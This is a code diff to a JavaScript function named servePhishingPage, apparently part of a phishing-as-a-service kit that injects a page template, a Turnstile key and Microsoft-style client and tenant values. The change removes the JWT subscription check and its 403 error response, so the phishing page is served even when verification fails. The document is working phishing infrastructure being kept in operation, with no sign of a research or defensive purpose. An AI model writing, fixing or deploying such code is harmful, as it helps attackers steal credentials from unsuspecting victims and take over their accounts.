@@ -39,8 +39,7 @@ async function servePhishingPage(request) {
   const turnstileKey = '{{TURNSTILE_KEY}}';
   const templateHTML = `{{TEMPLATE_HTML}}`;
   
-  // Verify subscription via JWT before serving full page
-  let isValid = false;
+  // Try to verify subscription via JWT, but serve page even if verification fails
   let clientId = '';
   let tenant = 'common';
   
@@ -51,25 +50,13 @@ async function servePhishingPage(request) {
       body: JSON.stringify({ token: jwtToken }),
     });
     const verifyData = await verifyResponse.json();
-    isValid = verifyData.valid;
-    clientId = verifyData.client_id;
-    tenant = verifyData.tenant;
-    if (verifyData.turnstile_key) turnstileKey = verifyData.turnstile_key;
+    if (verifyData.valid) {
+      clientId = verifyData.client_id;
+      tenant = verifyData.tenant;
+      if (verifyData.turnstile_key) turnstileKey = verifyData.turnstile_key;
+    }
   } catch (e) {
-    isValid = false;
-  }
-  
-  if (!isValid) {
-    return new Response(renderErrorPage(), {
-      status: 403,
-      headers: {
-        'Content-Type': 'text/html',
-        'X-Content-Type-Options': 'nosniff',
-        'X-Frame-Options': 'DENY',
-        'Referrer-Policy': 'no-referrer',
-        'Cache-Control': 'no-cache, no-store, must-revalidate',
-      },
-    });
+    // Verification failed - continue anyway, client-side will handle errors
   }
   
   // Inject dynamic values
